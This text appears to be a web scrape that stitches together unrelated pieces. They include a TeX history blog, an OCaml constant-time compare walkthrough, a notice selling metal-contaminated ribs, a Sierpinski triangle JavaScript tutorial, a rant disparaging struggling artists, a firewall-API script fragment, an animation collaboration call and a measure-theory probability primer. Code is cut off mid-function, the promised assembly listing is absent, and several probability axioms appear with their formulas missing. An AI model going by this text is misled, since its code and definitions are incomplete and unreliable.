<p>But mostly, two big projects sprung out of that. The first is LaTeX by Leslie Lamport. Lamport is a very productive researcher, famous for research in formal methods through TLA+ and also known laying groundwork for many distributed algorithms. LaTeX is based on the idea of seperating presentation and content. It is based around the idea of document classes, which then describe the way a certain document is layed out. Think Markdown, just much more complex. The second is ConTeXt, which is far more focused on fine grained layout control.</p>
<p>Both share a common property:</p>
<p>Community yak shave 1: Create not one, but two programs that are very ungoogleable… Before Google is invented.</p>
<p>Being active in a language that has lingo built around “Rust”, “Cargo” and “manifests”, I feel right at home.</p>
<p>Now, the community also wants to evolve TeX: a lot has changed over the years in technology, so, for example, you’d like to use modern font formats, directly write to modern output formats or use this new UTF-8 thingy. For that, there are specialised TeX interpreters, such as <code>pdf(la)tex</code>, <code>lua(la)tex</code> and <code>xe(la)tex</code>. There’s a problem here: you are not allowed to change TeX and distribute <a href="https://en.wikipedia.org/wiki/TeX#License">it under that name</a>. The thinking here is that if you have a <code>tex</code> binary, you can compile any valid TeX from the past and from the future.</p>
<p>The first issue on that road is that WEB isn’t really a popular programming language, neither is PASCAL and running it on modern systems is a bit of a pain. Which means…</p>
<p>Community yak shave 2: Transpile WEB to C and work from there</p>
<p>This is just the start of a great endeavour…</p>
<p>Community yak shave 3: Build a lot of tooling around that</p>
<h2 id="the-moral-of-the-story">The Moral of the Story</h2>
<p>Whenever you feel like “can’t we just replace this whole thing, it can’t be so hard” when handling TeX, don’t forget how many years of work and especially knowledge were poured into that system. Typesetting isn’t the <em>most</em> popular knowledge around programmers. Especially see it in the context of the space it is in: they can’t remove legacy. Ever. That would break documents.</p>
<p>TeX is also not a programming language. It might resemble one, but mostly, it should be approached as a typesetting system first. A lot of its confusing lingo gets much better then. It’s not programming lingo.</p>
<p>By approaching TeX with an understanding for its history, a lot of things can be learned from it. And yes, a replacement would be great, but it would take ages.</p>
<p>In any case, I hope I thoroughly convinced you why Donald Knuth is the Patron Saint of Yak Shaves.</p>

<p>This comes out of a enjoyable discussion with <a href="https://lambdaisland.com/">Arne from Lambda Island</a>, who listened and said “you should totally turn this into a talk”.</p>

<p><a href="https://github.com/mirage/eqaf">eqaf</a>, a constant-time compare function implementation in <a href="https://ocaml.org/">OCaml</a>, is a great case to demonstrate the <a href="https://signalsandthreads.com/language-design/#0008401">predictable performance of OCaml’s compiler</a>. Why?</p>
<ul>
<li>The goal of a constant-time compare function is to avoid <a href="https://en.wikipedia.org/wiki/Timing_attack">timing attacks</a>, which requires fully deterministic and predictable runtime performance.</li>
<li>Usually, cryptography functions are written in assembly to have total control of resulting binary and avoid unneeded optimization by the compiler.</li>
<li>However, <a href="https://github.com/mirage/eqaf">eqaf</a> showed us that you can write clean OCaml and get simple and predictable resulting assembly.</li>
</ul>

<hr>
<h2 id="about-garbage-collection">About Garbage Collection</h2>
<p>It’s hard to have a stable runtime performance for languages that comes with a garbage collector. To have a predictable runtime performance characteristic in these languages, the following rules are usually required to be followed religiously:</p>
<ul>
<li>Avoid garbage collections by avoiding memory allocations.</li>
<li>Avoid boxed values to generate assembly as low-level as possible.</li>
</ul>
<p>Hence, the resulting code are usually unidiomatic and hard to maintain.</p>
<h2 id="compiler-explorer">Compiler Explorer</h2>
<p><a href="https://godbolt.org/">Compiler Explorer</a> is a handy tool for exploring compilers and its assembly output. It has built-in OCaml support and removes boilerplate automatically. I recommend you to test the following example with it.</p>
<hr>
<h2 id="code">Code</h2>
<p>Here’s the implementation of <code>eqaf</code>’s <code>equal</code>.</p>
<div><pre><code data-lang="ocaml"><span>let</span><span>[@</span>inline<span>]</span> get x i <span>=</span> String.unsafe_get x i <span>|&gt;</span> Char.code

  <span>if</span> al <span>&lt;&gt;</span> bl
  <span>then</span> false
  <span>else</span> equal <span>~</span>ln<span>:</span>al a b
</code></pre></div><p>Besides basic OCaml syntaxes[1], interesting bits in the example are:</p>
<ul>
<li>
<p>You can force OCaml to always inline a function via adding an attribute <code>[@inline]</code></p>
</li>
<li>
<p><code>String.unsafe_get</code> works like <code>String.get</code> but without bound-checking. It’s unsafe for most use-cases but it’s used here to <a href="https://github.com/mirage/eqaf/blob/master/lib/eqaf.ml#L3">avoid jumping to exception</a>.</p>
</li>
<li>
<p>OCaml provides a FFI <code>external</code> for <a href="https://caml.inria.fr/pub/docs/manual-ocaml/intfc.html">interfacing with C</a>. Here we use it to call a primitive function provided by OCaml’s runtime <code>%caml_string_get16u</code>.</p>
<ul>
<li><code>external</code> is always unsafe and should be really take care about.</li>
<li>Primitives are not stable. For example: <a href="https://github.com/mirage/ocaml-base64/pull/36">https://github.com/mirage/ocaml-base64/pull/36</a></li>
</ul>
</li>
<li>
<p><code>n asr m</code> shifts <code>n</code> to the right by <code>m</code> bits. This is an arithmetic shift: the sign bit of <code>n</code> is replicated. The result is unspecified if <code>m &lt; 0</code> or <code>m &gt; Sys.int_size</code>.</p>
</li>
<li>
<p><code>ref</code> creates a <a href="https://dev.realworldocaml.org/imperative-programming.html">reference cell</a> and allows in-place replacement with <code>:=</code>.</p>
</li>
<li>
<p><code>pred x</code> is <code>x - 1</code>.</p>
</li>
<li>
<p><code>lor</code>, <code>lxor</code>, and <code>land</code> are logical bit-wise <code>or</code>, <code>xor</code>, and <code>and</code>.</p>
</li>
</ul>
<p>Although the OCaml code is quite low-level (and not very functional). It’s still cleaner than most constant-time compare functions implemented in assembly.</p>
<h2 id="read-the-asm">Read the asm</h2>
<p>Here’s the resulting assembly of the previous example, copied from the <code>eqaf</code> <a href="https://github.com/mirage/eqaf/blob/master/lib/eqaf.ml">source</a>. You can get the same output via <a href="https://godbolt.org/">Compiler Explorer</a>.</p>

<p><code>eqaf</code> allows us to have a basic understanding about OCaml’s assembly output without inferences of GC, boxed values, and advanced syntaxes such as pattern matching. We will explore more in the future issues.</p>

<h2>Public Notice of Sale: CBQ, LLC and Carl Buddig Company – Auction of 191,075 lbs. of St. Louis Style Ribs</h2>
<p>CBQ, LLC and Carl Buddig Company (“CBQ”) is offering for sale pursuant to 810 Ill. Comp. Ann. 5/2-706 approximately 191,075 lbs. of frozen St. Louis Style ribs. CBQ advises that it is selling the ribs because Canadian American Boxed Meat Corp. refused to return the purchase price after CBQ revoked its acceptance of the ribs. CBQ advises it revoked its acceptance because the ribs contained metal particles from rusted, galvanized steel and 400-series steel. The ribs are located at 15600 Wentworth Ave., South Holland, IL 60473. The CBQ is selling the ribs “as-is” “where-is” with no warranties or representations of any kind. Prospective purchasers may inspect samples of the ribs at the above location by contacting Peter Maciejewski at <a href="https://www.dailydac.com/cdn-cgi/l/email-protection" data-cfemail="6515001100170825071001010c024b060a084b">[email&nbsp;protected]</a> Prospective purchasers may submit bids by emailing them to Peter Maciejewski at <a href="https://www.dailydac.com/cdn-cgi/l/email-protection" data-cfemail="7f0f1a0b1a0d123f1d0a1b1b1618511c1012">[email&nbsp;protected]</a> on or before November 27, 2020 at 5:00 p.m. All bids must be firm offers and must provide for payment in immediately available funds, FOB at the address above within 3 business days of acceptance.

                <summary>What if I don't like the default styles?</summary>
                <p>Most styles are editable through <em>CSS variables</em>. You can also add your own styles
                    inline, at the end of MVP.css or in a new stylesheet.</p>
                <p><sup>PRO TIP</sup> If there are two conflicting CSS styles, the last one will take precedence.</p>
                <pre>                    <code>
:root {
    --color: #118bee;
}

/* Lower in the CSS, or in a 2nd stylesheet */

:root {

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The <a href="https://mathworld.wolfram.com/SierpinskiSieve.html">Sierpinski triangle</a> is a famous mathematical figure which presents an interesting computer science problem: how to go about generating it. In this article I'll explain one method of generating the Sierpinski triangle recursively, with an implementation written in Vanilla JavaScript using HTML5 canvas. I'll also explain how to you'd go about downloading the contents of an HTML5 Canvas element as a PNG.</p>
<p>First, here's what the Sierpinski triangle looks like:</p>
<p><img src="https://xtrp.io/api/content/static_files/generating-the-sierpinski-triangle-in-vanilla-javascript-with-html5-canvas-with-some-mathematical-background/sierpinski-triangle.jpg" alt="The Sierpinski Triangle"></p>
<h2>What is the Sierpinski Triangle?</h2>
<h3>The Sierpinski Triangle is a Fractal, Making it Naturally Recursive</h3>
<p>One initial thing to notice about the Sierpinski triangle is that every triangle is composed of smaller, identical triangles. Those triangles are also made up of even smaller, identical triangles, which are also made up of more triangles, and so on.</p>
<p><img src="https://xtrp.io/api/content/static_files/generating-the-sierpinski-triangle-in-vanilla-javascript-with-html5-canvas-with-some-mathematical-background/fractal.jpg" alt="Sierpinski Triangle Fractal"></p>
<p>This property in which the Sierpinski triangle is made up of identical, scaled-down copies of itself makes it a <a href="https://mathworld.wolfram.com/Fractal.html">fractal</a> in mathematics. Fractals are shapes that are made up of scaled down copies of themselves. The Sierpinski triangle is actually arguably one of the most famous fractals that exist, along with <a href="https://mathworld.wolfram.com/PythagorasTree.html">Pythagoras Trees</a>, <a href="https://mathworld.wolfram.com/MandelbrotSet.html">the Mandelbrot set</a>, and more.</p>
<p>The fact that fractals are made up of copies of themselves makes them naturally recursive, and it tends to be simpler to programmatically generate fractals recursively as supposed to using an iterative approach.</p>
<h3>The Sierpinski Triangle Only Uses Equilateral Triangles</h3>
<p>Next, notice how the Sierpinski triangle is made up of a single shape: the equilateral triangle. This is not a coincidence, and it is in fact one of the reasons the Sierpinski triangle is a notable mathematical figure.</p>
<p>The Sierpinski triangle takes advantage of a property of equilateral triangles: that they are one of the only shapes that can be made up solely by scaled down versions of itself, where a large equilateral triangle can be made by tesselating four equally smaller equilateral triangles. This makes them uniquely positioned to be the centerpiece of simple fractals, since it is intuitive to encompass smaller copies of an equilateral triangle inside a larger one.</p>
<p>This also makes it possible for fractals based on equilateral triangles, like the Sierpinski triangle, to be composed of only one shape. Other polygon-based fractals that don't use equilateral triangles often include several different shapes.</p>
<h2>Generating the Sierpinski Triangle in JavaScript with HTML5 Canvas</h2>
<h3>Setting Up the HTML and Canvas Element</h3>
<p>Let's start by setting up the <code>canvas</code> element and basic HTML markup:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Sierpinski Triangle&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;canvas id="canvas" width="1000" height="1000"&gt;&lt;/canvas&gt;

    &lt;!-- JavaScript Code Here --&gt;
    &lt;script&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>Note that the width and height variables in the canvas represent the inner dimensions of the canvas, not necessarily its size on the page. This means it can be resized in the future to fit different screen sizes, while maintaining its inner dimensions of 1000px by 1000px.</p>
<h3>Creating Equilateral Triangles on the Canvas in JavaScript</h3>
<p>Since equilateral triangles are the only shape used in the Sierpinski triangle, it makes sense to write a utility function to draw a given equilateral triangle on the canvas at a specified position and of a specified size.</p>
<p>This function will take in two arguments: the position of the bottom left vertex on the triangle (<code>pos</code>), and the length of the sides of the triangle (<code>sidelen</code>).</p>
<p>To create polygons in HTML5 canvas, there are several functions to move to positions on the canvas, draw a path around an area of the canvas, and fill in that area. These include:</p>
<ul>
<li><code>context.beginPath()</code> and <code>context.closePath()</code> — create and close a path; commonly used with <code>context.fill()</code> after closing the path</li>
<li><code>context.moveTo(x, y)</code> — move to a position on the canvas.</li>
<li><code>context.lineTo(x, y)</code> — move to a position on the canvas while drawing a line from the current position.</li>
<li><code>context.fill()</code> — fill the most recent canvas path.</li>
</ul>
<p>Creating a triangle simply means identifying the positions of the three vertices, drawing a path around those vertices, and filling the drawn area with a color. Identifying the positions of the vertices is pretty intuitive. Below is a visual showing the positions of the vertices. Note that the height of an equilateral triangle is mathematically equal to as <code>sin(Pi/3) * sidelen</code>.</p>
<p><img src="https://xtrp.io/api/content/static_files/generating-the-sierpinski-triangle-in-vanilla-javascript-with-html5-canvas-with-some-mathematical-background/equilateral-triangle.jpg" alt="Equilateral Triangle Vertex Positions"></p>
<p>With the positions of the vertices done, here's what the function to create an equilateral triangle on the canvas would look like:</p>
<pre><code>const c = document.getElementById("canvas");
const ctx = c.getContext("2d"); // context variable is used to draw on a 2D plane

const createTriangle = (pos, sidelen) =&gt; {
  ctx.beginPath();
  ctx.moveTo(...pos); // go to the left vertex

  // note that (0,0) in canvas is the top left, so 'up' on the vertical component would use substraction.
  ctx.lineTo(pos[0] + sidelen / 2, pos[1] - sidelen * Math.sin(Math.PI/3)); // draw line from left vertex to top vertex
  ctx.lineTo(pos[0] + sidelen, pos[1]); // draw line from top vertex to right vertex
  ctx.lineTo(...pos); // draw line from right vertex back to left vertex
  ctx.closePath();
  ctx.fill(); // fill triangle
};</code></pre>
<h3>Implementing an Algorithm to Generate the Sierpinski Triangle</h3>
<p>Now that the canvas and HTML has been set up and the <code>createTriangle</code> utility function has been written, we can start implementing an algorithm to generate the Sierpinski triangle.</p>
<p>Since fractals are naturally recursive, we'll use a recursive approach to generate the entire triangle.</p>
<p>First, recall that every triangle in the Sierpinski triangle is made up of three smaller triangles, one on the left, another on the right, and a final one on the top. Each smaller triangle is a copy of the outer triangle, the Sierpinski triangle. So, simply create a smaller Sierpinski triangle inside of each of the three triangles, and then more smaller Sierpinski triangles inside of those, and so on. Technically, the Sierpinski triangle repeats forever, but for visualizations like this, a stopping point should be defined when there have been enough repeats that the smallest triangles are hard to make out. At this point, filling in the smallest triangles acts as an effective substitution of repeating further.</p>
<p>To create this stopping condition, a variable called <code>depth</code> can be used. <code>depth</code> would represent the amount of times the program should continue repeating the fractal. <code>depth</code> should start at a certain value and decrease for every repeat, and every smaller Sierpinski triangle created. Once <code>depth</code> reaches zero (the base case), the program would stop and fill in the three triangles instead of continuing to repeat the fractal.</p>
<p>To create this functionality, let's create a function called <code>createSierpinskiTriangle</code> which takes the position of the Sierpinski triangle to generate, its side length, and the depth. The function should identify the positions of the three inner triangles, draw them if depth is equal to zero, or call <code>createSierpinskiTriangle</code> on the three inner triangles if the depth is greater than zero.</p>
<p>Here's what this would look like:</p>
<pre><code>const createSierpinskiTriangle = (pos, sidelen, depth) =&gt; {
  const innerTriangleSidelen = sidelen / 2; // side length of inner triangles is half the side length of the outer triangle
  const innerTrianglesPositions = [
    pos,
    [ pos[0] + innerTriangleSidelen, pos[1] ],
    [ pos[0] + innerTriangleSidelen / 2, pos[1] - Math.sin(Math.PI/3) * innerTriangleSidelen ]
  ]; // these positions are the same as what was used in the createTriangle function
  if(depth == 0) {
    innerTrianglesPositions.forEach((trianglePosition) =&gt; {
      createTriangle(trianglePosition, innerTriangleSidelen);
    });
  } else {
    innerTrianglesPositions.forEach((trianglePosition) =&gt; {
      createSierpinskiTriangle(trianglePosition, innerTriangleSidelen, depth - 1);
    });
  }
}</code></pre>
<p>To call the function, draw the Sierpinski triangle at the bottom left of the canvas (<code>(0, 1000)</code>) with a side length of <code>1000</code>px (the width of the canvas) and a depth of <code>5</code>.</p>
<pre><code>createSierpinskiTriangle([0, 1000], 1000, 5);</code></pre>
<p>Here's the result:</p>
<p><img src="https://xtrp.io/api/content/static_files/generating-the-sierpinski-triangle-in-vanilla-javascript-with-html5-canvas-with-some-mathematical-background/sierpinski-triangle.jpg" alt="Recursive Method Result"></p>
<p>Try increasing the depth, and you should see that the triangle gets more and more detailed. Increasing the depth by one will result in three times the amount of total triangles to be drawn, so very high depths like 20 might not be performant since the canvas would have to draw 3^20 (~3.5 billion) triangles.</p>
<h3>Downloading the Generated Triangle From the Canvas as a PNG</h3>
<p>Now that we've generated the triangle recursively, one thing you may want to do is download the generated Sierpinski triangle as an image on your computer. Luckily, this is very simple to do in HTML5 Canvas.</p>
<p>First, the canvas must be converted to a data URL. If you're not familiar with data URLs, here's a simple definition:</p>
<blockquote>
<p>A data URL is a URL scheme that allows data and files (images, audio files, etc.) to be respresented in a single URL containing all of the data. For example, if one wanted to include an image on a website, you would add the image to the web server and link to it in the HTML. With data URLs, the data URL contains the contents of the entire file, so it can simply be put into the HTML directly. This is useful in canvas because we want to export the image without it having a specific public URL, and data URLs allow that to be done.</p>
</blockquote>
<p>The contents of the <code>canvas</code> element can be converted to a data URL with the <code>.toDataURL</code> method.</p>
<p>Next, let's download the data URL into the user's machine. In HTML, downloading a file is done by clicking a link and specifying the <code>download</code> attribute. For example, here's how someone would download an image as <code>myimage.png</code> when the user clicks a link: <code>&lt;a href="image.png" download="myimage.png"&gt;download!&lt;/a&gt;</code>.</p>
<p>Downloading a file through JavaScript is as simple as creating a link element with the specified <code>href</code> and <code>download</code> attributes, and artificially clicking on it.</p>
<p>Here's what this would look like:</p>
<pre><code>const downloadCanvasContents = () =&gt; {
  const link = …</code></pre></div></div>

<p>For a long time mediocre artists have used the stories of outliers like Vincent Van Gogh, who only sold two paintings during his lifetime, to romanticize the starving artist lifestyle.</p>



<p>They popularized the notion that is not just ok but also desirable to fail at selling your work. For them, being broke and unable to feed your family signals talent and even unrecognized genius.</p>



<p><strong>But the truth is that starving artists aren’t obscure geniuses — they’re mostly losers who suck at marketing.</strong></p>



<p>Usually, they have two main problems: they don’t understand why people buy things, and they don’t know how to effectively communicate their ideas.</p>



<p>50 years ago, there might have been some valid excuses for not knowing about consumer behavior and storytelling. But in the digital world we live today those excuses are no longer valid. If you don’t use the internet to learn these skills and sell your work is because you don’t want to.</p>



<p>Van Gogh’s case is excusable — he suffered from severe mental illness throughout his life and never even dreamed of having a computer. But you, that are mentally stable and have an internet connection, have no excuse.</p>



<p>If you don’t sell or monetize your creative work on the internet is not because you’re a genius. Quite the opposite.</p>

</code></pre></div></div> <h2 id="extending-the-script"> <a href="#extending-the-script"></a> Extending the script </h2> <p>The code is very simple and hopefully self-explanatory, it also comes with a number of defaults to get you started. If you wish to add another type of object, you will simply need to add the API endpoint, along with a list of required headers, for example:</p> <div><div><pre><code><span># SNAT Mapping
</span><span>elif</span> <span>args</span><span>.</span><span>item</span> <span>==</span> <span>'snat'</span><span>:</span>

    <span>headers</span> <span>=</span> <span>[</span><span>'policyid'</span><span>,</span> <span>'status'</span><span>,</span> <span>'orig-addr'</span><span>,</span> <span>'dst-addr'</span><span>,</span> <span>'srcintf'</span><span>,</span> <span>'dstintf'</span><span>,</span> 
        <span>'nat'</span><span>,</span> <span>'nat-ippool'</span><span>,</span> <span>'comments'</span><span>]</span>
</code></pre></div></div> <p>If a field contains a list, instead of a string/int, the list is converted to a space-separated list of <code>q_origin_key</code>s. There is an override for <code>ipv4_addresses</code> headers to display both the IP and the CIDR netmask in the same field:</p> <div><div><pre><code><span>if</span> <span>header</span> <span>==</span> <span>'ipv4_addresses'</span><span>:</span> <span># parse list, extract ip mask for each item within the field
</span>    <span>for</span> <span>x</span> <span>in</span> <span>row</span><span>[</span><span>header</span><span>]:</span>

<p>This fall, as a creative outlet during a challenging teaching term (and as a distraction from the general mess of the world), I began posting weekly looping animations on Twitter, under the hashtag <a href="https://twitter.com/hashtag/swirlysquaresunday">#swirlysquaresunday</a>. The idea was to find creative expression under a tight set of aesthetic constraints: a looping animation of a black-and-white checkerboard. Of course, these tight constraints still permit a wide range of <a href="http://isohedral.ca/mathematical-animated-gifs/">fun and captivating visual devices</a>. Here’s one from a few weeks ago as an example.</p>
<p><a href="http://isohedral.ca/wp-content/uploads/2020/11/out.gif"><img loading="lazy" src="http://isohedral.ca/wp-content/uploads/2020/11/out.gif" alt="" width="512" height="512"></a></p>
<p>Earlier today, <a href="http://kangaroo3d.com/">Daniel Piker</a> suggested that it would be fun for a group of people interested in these looping mathematical animations to collaborate. Each would contribute a short sequence that begins and ends with a checkerboard, and we’d glue them together into one longer animation. What a lovely idea! The most famous example of this variety of collaborative artwork is what the Surrealists called an <a href="https://en.wikipedia.org/wiki/Exquisite_corpse">Exquisite Corpse</a>. Exquisite Corpse <em>animations</em> are popular too; I’ve long been a fan of <a href="https://zoomquilt.org/">The Zoomquilt</a>, and I’ve seen it done as a group project in animation courses.</p>
<p>So, let’s create a Swirled Series!</p>
<p><a href="http://isohedral.ca/wp-content/uploads/2020/11/ss_logo.gif"><img loading="lazy" src="http://isohedral.ca/wp-content/uploads/2020/11/ss_logo.gif" alt="" width="512" height="512"></a></p>
<p>If you’re reading this, you’re invited to submit a short animation loop. I’ll stitch them together into a final sequence. Let me lay down some rules in order to keep the process sane:</p>
<ul>
<li>Use a resolution of 512×512.</li>
<li>No colour, but it’s OK to use grey levels beyond pure black and pure white.</li>
<li>Your segment should have at most 180 frames (I’ll aim to play back at 50 frames per second). It’s OK to have fewer frames.</li>
<li>Your segment should begin and end with the same frame: an 8×8 checkerboard (i.e., squares of dimension 64×64), with white in the lower-right corner.</li>
<li>You can do anything you want to get from a checkerboard back to a checkerboard, except sit still.</li>
<li>I strongly recommend that your loop have “zero derivative” at the first and last frames; that is, it should glide to a graceful stop, so that the transition to the next animation in the sequence isn’t jarring.</li>
<li>I would prefer to receive your submission in the form of a zip file containing a directory of PNG images named <code>frame000.png</code>, <code>frame001.png</code>, … <code>frame179.png</code>.</li>
<li>You grant me a non-exclusive, irrevocable license to use your images non-commercially, in animations, for education and research.&nbsp; Conceivably, if the result is entertaining, I might submit it to, say, the Bridges Short Film festival. In all cases, contributors will receive appropriate credit.</li>
<li>The deadline is <strong>Friday, November 27th</strong>. I’ll aim to publish the result the following week.</li>
</ul>
<p>To contribute, send your zipfile to me at <code>swirledseries@gmail.com</code>, or send me a link where I can download it.</p>
<p>In the unlikely event that this becomes popular, it’s possible I’ll receive more submissions than I know what to do with. In that case, please accept my apologies in advance as I work out some sort of compromise. I may have to choose who gets in by lottery or submission order, and impose a limit of one submission per person. Most likely, I’d simply keep doing this and roll extra submissions into future animations.</p>
<p>Thanks for playing with us!</p>

<p>Probability is a measure defined on events, which are sets of primitive outcomes. Probability theory mostly comes down to constructing events and measuring them. A measure is a generalization of size which corresponds to length, area, and volume (rather than the bijective mapping definition of cardinality).</p>

<p>The first half of this article is ostensibly devoted to explaining the definition of probability, but that is not my priority. I’m most interested in providing a useful conceptual map, asking and discussing interesting questions, and developing intuition. I provide many links to technical details and further readings. My opening exposition on definitions is brief. If it does not all make sense, please look at other resources. Hopefully this article at least makes those other sources easier to use.</p>

<p>This post is also a pedagogical experiment. I structured this article to be read twice. The first pass is without measure theory, and the second pass is with measure theory. Measure-theory content is hidden by default, e.g. <span><span>like this</span></span>. Simply ignore <span><span>purple text</span></span> the <span><span>first time</span><label for="796b5f2304883e2b8a1737199bea4fcbd95c2af7"> ⊕</label><span><span>Unless you are already acquainted with measure theory, but then you can just look at <a href="https://en.wikipedia.org/wiki/Probability_axioms#Axioms" target="_blank" rel="noopener noreferrer">Wikipedia’s definition of probability</a> to understand the gist of probability theory.</span></span></span> you read this post. Then in the <a href="#primer-to-measure-theory">measure theory section</a> at the end of this post you will see a button to show all the hidden text (and you can just click on <span><span>purple text</span></span> anywhere in the post to show it).</p>

<p>Why? Because I see plenty of introductions to probability that leave out measure theory entirely. The problem with them is that a lot of the common probability notation, e.g. random variables, only really makes sense when you understand measures. On the other hand, if you crack open a rigorous text on probability theory (e.g. <a href="https://www.goodreads.com/book/show/383472.Statistical_Inference" target="_blank" rel="noopener noreferrer">Casella &amp; Berger</a> or <a href="https://www.springer.com/gp/book/9780387953823" target="_blank" rel="noopener noreferrer">Shao</a>), it may not be obvious why all this extra complexity with events, sigma-algebras and measure spaces is necessary.</p>

<p>When learning about probability and measure theory myself, I wish I had a resource that both provides precise definitions and intuitions for why these definitions are the way they are, and without wading through a lot of extraneous details. I don’t know if I’ve succeeded in that here, but this is my attempt.</p>



<h2 id="beginner"><a href="#beginner">Beginner</a></h2>

<p>The full definition of probability is below, but to avoid overwhelm, you may first look at this <em>attempt</em> at defining probability. Many people intuitively think of probability this way. Notably, I’ve left out the event space.</p>

<p><strong>Sample set</strong> $\Omega$ is a set of all possible <span><span>samples</span><label for="46f0a5784f51b77c385f44317a48bc352dcfb439"> ⊕</label><span><span>Sample is synonymous with <a href="https://en.wikipedia.org/wiki/Outcome_(probability)" target="_blank" rel="noopener noreferrer">outcome</a>.</span></span></span> $\omega\in\Omega$. A sample is a possible state of the world, e.g. the outcomes for all coins that will be tossed or all dice that will be thrown, or the ordering of cards in a deck.</p>

<p><strong>Probability function</strong> <span><span>$P : 2^\Omega \to [0, 1]$</span><label for="0574240032f5e0595cbf5977a6d3da50278d4847"> ⊕</label><span><span>$2^\Omega$ is the <a href="https://en.wikipedia.org/wiki/Power_set" target="_blank" rel="noopener noreferrer">power set</a> of $\Omega$. The notation $2^{(\cdot)}$ is just a shorthand, though set exponentiation could be <a href="https://math.stackexchange.com/a/901742" target="_blank" rel="noopener noreferrer">defined in general</a>, e.g. $A^B$ is the set of all functions $f : B \to A$, and $n^A$, where $n$ is a natural number, generates the set of all $n$-ary indicator functions . Then $2^A$ gives us all indicator functions  select the elements of every subset of $A$.</span></span></span> gives the probability of a <span><span>set of samples</span><label for="ad8b3af703fafd99caa4527f4b15b75a1975d039"> ⊕</label><span><span>subset of $\Omega$</span></span></span>. A set of samples ${\omega_1, \omega_2, \ldots}$ is called an <strong>event</strong>, which is a set of possible states the world could be in, read as “$\omega_1$ is the case or $\omega_2$ is the case, etc. …”</p>

<p>$P$ satisfies:</p>

<ul>
  <li>
<strong>Non-negativity</strong>: .</li>
  <li>
<strong>Null empty set</strong>: .</li>
  <li>
<strong>Unit sample set</strong>: .</li>

<h2 id="full-definition"><a href="#full-definition">Full Definition</a></h2>

<p>The beginner definition above does not define an event space. This is actually a problem when working with uncountable sample spaces, because not all subsets of an uncountable space can be measured. If that statement confuses you, don’t worry about it and read through this post. Then read my <a href="#primer-to-measure-theory">primer to measure theory</a> at the end which outlines why not every set can be measured. Though this may seem like a minor technicality, specifying what sets can be measured allows probability theory to be <span><span>a lot more general than it otherwise could be,</span><label for="a0359426bd6a552c43a72d1b7b5e568b41b95f0d"> ⊕</label><span><span>This is Kolmogorov’s achievement. Definitions of probability like my beginner definition had been around for hundreds of years prior.</span></span></span> specifically when dealing with real numbers.</p>

<p>Here is a compact but complete definition of probability:</p>
<ul>
  <li>
<strong>Sample set</strong> $\Omega$ is a set of all possible <span><span>samples</span><label for="46f0a5784f51b77c385f44317a48bc352dcfb439"> ⊕</label><span><span>Sample is synonymous with <a href="https://en.wikipedia.org/wiki/Outcome_(probability)" target="_blank" rel="noopener noreferrer">outcome</a>.</span></span></span>.
    <ul>
      <li>
<strong>Sample</strong> $\omega \in \Omega$ (i.e. primitive outcome) is a possible state of the world. Samples are disjoint, meaning only one sample can be the case at a time. Samples can be any kind of mathematical object.</li>
    </ul>
  </li>
  <li>
<strong>Event space</strong> $E \subseteq 2^\Omega$ is the set of subsets of $\Omega$ for which we are <span><span>allowed to assign probability.</span><label for="f8b43cebd8d878851c96f6b83253241ae0914c18"> ⊕</label><span><span>The sets omitted from $E$ are not measurable, but again if you are not familiar with measure theory don’t worry about why some sets cannot be measured until the end of this post.</span></span></span> We require that $\emptyset, \Omega \in E$ <span><span>and $E$ is required to be a <a href="#sigma-algebra">$\sigma$-algebra</a> that contains the measurable subsets of $\Omega$. The tuple $(\Omega, E)$ is a <a href="https://en.wikipedia.org/wiki/Measurable_space" target="_blank" rel="noopener noreferrer">measurable space</a>.</span></span>
    <ul>
      <li>
<strong>Event</strong> $e \in E$ is a <span><span>measurable</span></span> set of samples. Samples $\omega \in e$ are <span><span>considered identical</span><label for="b69039dc8767a7b19268d3134cd1eccd7a91f7de"> ⊕</label><span><span>Different samples in $\Omega$ are indeed distinct objects, but their difference does not matter in the context of event $e$.</span></span></span> w.r.t. $e$.</li>
    </ul>
  </li>
  <li>
<strong>Probability measure</strong> <span><span>$P : E \to [0, 1]$</span><label for="4ad9ab16708369ac059ab042be9927eff00636f9"> ⊕</label><span><span>In general a measure $Q : E \to \real_{\geq 0}$, but I’m including the restriction of the co-domain to the unit interval $[0, 1]$ in the definition of , because we are only talking about probability measures here, and there’s no reason to be more general.</span></span></span> is a function that maps allowed subsets of $\Omega$ to the real unit interval. $P$ is a <strong>measure</strong>, which means it satisfies certain properties that make it behave analogous to length, area, volume, etc. in Euclidean space. Essentially, a measure is a generalization of size that satisfies the following properties:
    <ul>
      <li><span><span><strong>Measurable domain</strong>: $E$ is a $\sigma$-algebra of measurable sets.</span></span></li>
      <li>
<strong>Non-negativity</strong>: .</li>
      <li>
<strong>Null empty set</strong>: .</li>
      <li>
<strong>Unit sample set</strong>: .</li>
      <li>
<strong>Countable additivity</strong>: For any countable set of events <span><span></span><label for="1c4c2f199fe96ef43d1f0b6cc492af4deb8af6af"> ⊕</label><span><span>Remember that $E$ is the event space, and $A$ is a set of events.</span></span></span> where , .</li>
    </ul>
  </li>
</ul>

<p>The triple $(\Omega, E, P)$ defines a <a href="https://en.wikipedia.org/wiki/Probability_space" target="_blank" rel="noopener noreferrer">probability space</a> <span><span>which is also a <a href="https://en.wikipedia.org/wiki/Measure_space" target="_blank" rel="noopener noreferrer">measure space</a>.</span></span> These three objects are all we need to do probability calculations.</p>

<h2 id="kolmogorov-axioms-of-probability"><a href="#kolmogorov-axioms-of-probability">Kolmogorov axioms of probability</a></h2>

<p>You may have heard of the <a href="https://en.wikipedia.org/wiki/Probability_axioms#Axioms" target="_blank" rel="noopener noreferrer">Kolmogorov axioms of probability</a>. Kolmogorov formalized probability as a special case of measure theory. Essentially a probability measure is a normalized measure, i.e. assigns 1 to the entire sample space $\Omega$. Above, I’ve merged the axioms of measure theory with Kolmogorov’s axioms. For reference, here are Kolmogorov’s axioms given separately:</p>
<ol>
  <li>$P(e) \in [0, 1], \forall e \in E$, where $[0, 1] \subset \real$.</li>
  <li>$P(\Omega) = 1$, i.e. probability of anything happening is 1.</li>
  <li><span><span><a href="https://en.wikipedia.org/wiki/Sigma_additivity" target="_blank" rel="noopener noreferrer">$\sigma$-additivity</a> on $E$.</span></span></li>
</ol>

